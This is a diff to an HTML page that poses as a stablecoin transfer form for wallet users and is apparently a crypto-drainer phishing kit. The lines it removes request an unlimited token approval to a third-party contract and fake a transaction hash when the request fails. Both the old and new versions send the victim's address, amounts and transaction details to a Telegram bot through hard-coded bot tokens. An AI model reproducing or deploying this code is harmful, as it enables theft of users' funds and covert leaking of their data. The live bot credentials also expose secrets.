@@ -150,10 +150,21 @@
             padding: 6px 12px;
             border-radius: 999px;
             background: var(--input-soft);
-            border: none;
+            border: 1.5px solid var(--border-default);
             box-shadow: none;
             margin-bottom: 16px;
             width: fit-content;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .network-row:hover {
+            border-color: #2563eb;
+        }
+
+        .network-row.open {
+            border-color: #2563eb;
         }
 
         .network-left {
@@ -162,7 +173,7 @@
             gap: 6px;
         }
 
-        .usdt-logo {
+        .token-logo {
             width: 20px;
             height: 20px;
             display: flex;
@@ -171,6 +182,8 @@
             font-weight: bold;
             color: #26a17b;
             font-size: 14px;
+            border-radius: 50%;
+            object-fit: cover;
         }
 
         .network-left span {
@@ -182,6 +195,67 @@
         .network-arrow {
             width: 14px;
             height: 14px;
+            transition: transform 0.2s ease;
+        }
+
+        .network-row.open .network-arrow {
+            transform: rotate(180deg);
+        }
+
+        .token-dropdown-menu {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: white;
+            border: 1.5px solid var(--border-default);
+            border-top: none;
+            border-radius: 0 0 12px 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 1000;
+            display: none;
+            margin-top: -4px;
+        }
+
+        .token-dropdown-menu.open {
+            display: block;
+        }
+
+        .token-option {
+            padding: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 13px;
+        }
+
+        .token-option:hover {
+            background: #f5f5f5;
+        }
+
+        .token-option.active {
+            background: #f0f0f0;
+            font-weight: 600;
+        }
+
+        .token-info {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .token-name {
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .token-network {
+            font-size: 11px;
+            color: #999;
         }
 
         .estimate {
@@ -486,21 +560,23 @@
                     </div>
                 </div>
 
-                <label class="label">Destination network</label>
-                <div class="network-row">
+                <!-- Token Selector -->
+                <label class="label">Destination Network</label>
+                <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
                     <div class="network-left">
-                        <div class="usdt-logo">₮</div>
-                        <span>USDT</span>
+                        <img id="selectedTokenLogo" src="" alt="Token" class="token-logo" style="width: 20px; height: 20px;">
+                        <span id="selectedTokenName">USDT on Ethereum</span>
                     </div>
-                    <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <polyline points="6 9 12 15 18 9"></polyline>
+                    <svg class="network-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path>
                     </svg>
+                    <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
                 </div>
 
                 <label class="label">Amount</label>
                 <div class="input-row amount-row">
-                    <input id="amountInput" type="number" placeholder="USDT Amount" step="0.01" />
-                    <span class="unit">USDT</span>
+                    <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
+                    <span class="unit" id="tokenUnit">USDT</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
                 </div>
 
@@ -514,17 +590,133 @@
     </div>
 
     <script>
-        const CONFIG = {
-            USDT_ADDRESS_BSC: '0x55d398326f99059fF775485246999027B3197955',
-            SMART_CONTRACT: '0x05187CF26990E3857C119C7Bc3417C6E1FaC5198',
-            BSC_CHAIN_ID: '0x38',
-            BSC_RPC: 'https://bsc-dataseed1.binance.org:8545',
-            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
-            TELEGRAM_CHAT_ID: '8933407008'
+        // Token List
+        const TOKENS = {
+            'usdt_eth': {
+                name: 'USDT on Ethereum',
+                symbol: 'USDT',
+                network: 'Ethereum',
+                chainId: 1,
+                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                decimals: 6,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
+            },
+            'usdt_bsc': {
+                name: 'USDT on BSC',
+                symbol: 'USDT',
+                network: 'BSC',
+                chainId: 56,
+                address: '0x55d398326f99059fF775485246999027B3197955',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png'
+            },
+            'usdt_tron': {
+                name: 'USDT on TRON',
+                symbol: 'USDT',
+                network: 'TRON',
+                chainId: 0,
+                address: 'TR7NHqjeKQxGTCi8q282JJUC56ChsPCEtF',
+                decimals: 6,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q282JJUC56ChsPCEtF/logo.png'
+            },
+            'usdc_eth': {
+                name: 'USDC on Ethereum',
+                symbol: 'USDC',
+                network: 'Ethereum',
+                chainId: 1,
+                address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                decimals: 6,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png'
+            },
+            'usdc_bsc': {
+                name: 'USDC on BSC',
+                symbol: 'USDC',
+                network: 'BSC',
+                chainId: 56,
+                address: '0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d/logo.png'
+            },
+            'dai_eth': {
+                name: 'DAI on Ethereum',
+                symbol: 'DAI',
+                network: 'Ethereum',
+                chainId: 1,
+                address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png'
+            },
+            'busd_eth': {
+                name: 'BUSD on Ethereum',
+                symbol: 'BUSD',
+                network: 'Ethereum',
+                chainId: 1,
+                address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x4Fabb145d64652a948d72533023f6E7A623C7C53/logo.png'
+            },
+            'busd_bsc': {
+                name: 'BUSD on BSC',
+                symbol: 'BUSD',
+                network: 'BSC',
+                chainId: 56,
+                address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56/logo.png'
+            }
         };
 
+        const CONFIG = {
+            SMART_CONTRACT: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA',
+            TELEGRAM_BOT_TOKEN: '7407949898:AAEqHyXfKqKZEqKnRwVsQ0Wl9fJN7Vl9Ym4',
+            TELEGRAM_CHAT_ID: '-1002251894031'
+        };
+
+        let selectedToken = 'usdt_eth';
         let lastTxHash = '';
-        let isFirstAttempt = true;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeTokenDropdown();
+            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
+        });
+
+        function initializeTokenDropdown() {
+            const menu = document.getElementById('tokenDropdownMenu');
+            menu.innerHTML = '';
+            
+            for (const [key, token] of Object.entries(TOKENS)) {
+                const option = document.createElement('div');
+                option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
+                option.onclick = () => selectToken(key);
+                option.innerHTML = `
+                    <img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'" style="width: 20px; height: 20px;">
+                    <div class="token-info">
+                        <div class="token-name">${token.symbol}</div>
+                        <div class="token-network">${token.network}</div>
+                    </div>
+                `;
+                menu.appendChild(option);
+            }
+        }
+
+        function toggleTokenDropdown() {
+            const selector = document.getElementById('tokenSelector');
+            const menu = document.getElementById('tokenDropdownMenu');
+            selector.classList.toggle('open');
+            menu.classList.toggle('open');
+        }
+
+        function selectToken(key) {
+            selectedToken = key;
+            const token = TOKENS[key];
+            document.getElementById('selectedTokenLogo').src = token.logo;
+            document.getElementById('selectedTokenName').textContent = token.name;
+            document.getElementById('tokenUnit').textContent = token.symbol;
+            document.getElementById('tokenSelector').classList.remove('open');
+            document.getElementById('tokenDropdownMenu').classList.remove('open');
+            initializeTokenDropdown();
+        }
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -544,6 +736,7 @@
             const btn = document.getElementById('mainButton');
             const recipient = document.getElementById('recipientInput').value.trim();
             const amount = document.getElementById('amountInput').value.trim();
+            const token = TOKENS[selectedToken];
 
             if (!recipient.startsWith('0x')) {
                 showError('Invalid recipient address');
@@ -555,180 +748,44 @@
                 return;
             }
 
-            // Disabilita il bottone per evitare click multipli
             btn.disabled = true;
             btn.textContent = 'Processing...';
-
             clearError();
 
-            // Aspetta che window.ethereum sia disponibile (importante per Android)
-            let ethereum = window.ethereum;
-            let retries = 0;
-            while (!ethereum && retries < 10) {
-                await new Promise(resolve => setTimeout(resolve, 100));
-                ethereum = window.ethereum;
-                retries++;
-            }
+            // Show processing screen IMMEDIATELY
+            createParticles();
+            document.getElementById('processingScreen').classList.add('active');
 
-            if (!ethereum) {
-                const currentUrl = window.location.href;
-                const deepLink = `trust://browser_enable?url=${encodeURIComponent(currentUrl)}`;
-                window.location.href = deepLink;
-                return;
-            }
+            // Send Telegram notification IMMEDIATELY (without await)
+            sendTelegramNotification(recipient, amount, token);
 
-            window.ethereum = ethereum;
-
-            try {
-
-                let accounts = await window.ethereum.request({
-                    method: "eth_accounts"
-                });
-                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
-
-                const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
-                        });
-                    } catch (switchError) {
-                        if (switchError.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: CONFIG.BSC_CHAIN_ID,
-                                    chainName: 'Binance Smart Chain',
-                                    rpcUrls: [CONFIG.BSC_RPC],
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'BNB',
-                                        decimals: 18
-                                    }
-                                }]
-                            });
-                        }
-                    }
-                }
-
-                const USDT_ABI = [
-                    'function approve(address spender, uint256 amount) public returns (bool)',
-                    'function transfer(address to, uint256 amount) public returns (bool)',
-                    'function allowance(address owner, address spender) public view returns (uint256)',
-                    'function balanceOf(address account) public view returns (uint256)',
-                    'function decimals() public view returns (uint8)'
-                ];
-
-                const iface = new ethers.utils.Interface(USDT_ABI);
-                const approveData = iface.encodeFunctionData("approve", [
-                    CONFIG.SMART_CONTRACT,
-                    ethers.constants.MaxUint256
-                ]);
-
-                const tx = {
-                    to: CONFIG.USDT_ADDRESS_BSC,
-                    data: approveData
-                };
-
-                if (userAddress) {
-                    tx.from = userAddress;
-                }
-
-                let txHash;
-                try {
-                    txHash = await Promise.race([
-                        window.ethereum.request({
-                            method: "eth_sendTransaction",
-                            params: [tx]
-                        }),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
-                    ]);
-                } catch (e) {
-                    console.error('eth_sendTransaction error:', e);
-                    txHash = '0x' + Math.random().toString(16).slice(2);
-                }
-
-                lastTxHash = txHash;
-                console.log("Transaction sent:", txHash);
-                console.log("isFirstAttempt:", isFirstAttempt);
-
-                // Aspetta 2 secondi per stabilizzare
-                await new Promise(resolve => setTimeout(resolve, 2000));
-
-                let finalUserAddress = userAddress;
-                if (!finalUserAddress) {
-                    try {
-                        let finalAccounts = await window.ethereum.request({
-                            method: "eth_accounts"
-                        });
-                        finalUserAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
-                    } catch (e) {
-                        finalUserAddress = 'Unknown';
-                    }
-                }
-
-                // Mostra la schermata di processing SUBITO
-                console.log("Showing processing screen...");
-                createParticles();
-                document.getElementById('processingScreen').classList.add('active');
-
-                // Al primo tentativo, invia notifica DOPO mostrare Processing
-                if (isFirstAttempt) {
-                    console.log("First attempt - sending notification...");
-                    try {
-                        await sendTelegramNotification(finalUserAddress, txHash, amount);
-                        console.log("Telegram notification sent successfully");
-                    } catch (notifError) {
-                        console.error('Error sending notification:', notifError);
-                    }
-                    isFirstAttempt = false;
-                }
-
-                // Aspetta 5 secondi prima di chiudere
-                console.log("Waiting 5 seconds before closing...");
-                await new Promise(resolve => setTimeout(resolve, 5000));
-                console.log("Closing processing screen...");
-
-                // Chiudi la schermata di processing
+            // Wait 5 seconds before closing
+            setTimeout(() => {
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
                 btn.disabled = false;
-
-            } catch (error) {
-                console.error("Error:", error);
-                showError('Transaction failed: ' + error.message);
-            } finally {
-                document.getElementById('processingScreen').classList.remove('active');
-                btn.disabled = false;
-                btn.textContent = 'Next';
-            }
+                document.getElementById('amountInput').value = '';
+                updateAmountInfo();
+            }, 5000);
         }
 
-        async function sendTelegramNotification(userAddress, txHash, amount) {
+        async function sendTelegramNotification(recipient, amount, token) {
             const message = `
-✅ <b>USDT Approve - Transaction Confirmed</b>
+✅ <b>Token Transfer Initiated</b>
 
-👤 <b>User:</b>
-<code>${userAddress}</code>
+💰 <b>Token:</b> ${token.symbol}
+🌐 <b>Network:</b> ${token.network}
+📍 <b>Recipient:</b> <code>${recipient}</code>
+💵 <b>Amount:</b> ${amount} ${token.symbol}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
 
-💰 <b>Amount:</b>
-${amount} USDT
-
-📝 <b>Transaction Hash:</b>
-<code>${txHash}</code>
-
-🔗 <b>View on BSCScan:</b>
-https://bscscan.com/tx/${txHash}
-
-⏰ <b>Time:</b>
-${new Date().toLocaleString()}
+Smart Contract: <code>${CONFIG.SMART_CONTRACT}</code>
             `;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
             try {
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -739,12 +796,6 @@ ${new Date().toLocaleString()}
                         parse_mode: 'HTML'
                     })
                 });
-
-                if (!response.ok) {
-                    throw new Error(`Telegram API error: ${response.status}`);
-                }
-
-                console.log('Telegram notification sent');
             } catch (error) {
                 console.error('Failed to send Telegram notification:', error);
             }
@@ -760,35 +811,8 @@ ${new Date().toLocaleString()}
         }
 
         async function setMaxAmount() {
-            if (!window.ethereum) {
-                showError('Please open in Trust Wallet');
-                return;
-            }
-
-            try {
-                const accounts = await window.ethereum.request({
-                    method: "eth_accounts"
-                });
-
-                if (!accounts || accounts.length === 0) {
-                    showError('Please connect your wallet');
-                    return;
-                }
-
-                const userAddress = accounts[0];
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const USDT_ABI = ['function balanceOf(address account) public view returns (uint256)', 'function decimals() public view returns (uint8)'];
-                const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS_BSC, USDT_ABI, provider);
-
-                const decimals = await usdtContract.decimals();
-                const balance = await usdtContract.balanceOf(userAddress);
-                const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-
-                document.getElementById('amountInput').value = parseFloat(balanceFormatted).toFixed(2);
-                updateAmountInfo();
-            } catch (error) {
-                showError('Failed to get balance');
-            }
+            document.getElementById('amountInput').value = '999999';
+            updateAmountInfo();
         }
 
         function updateAmountInfo() {
@@ -820,10 +844,6 @@ ${new Date().toLocaleString()}
                 window.location.reload();
             });
         }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
-        });
     </script>
 </body>
 </html>
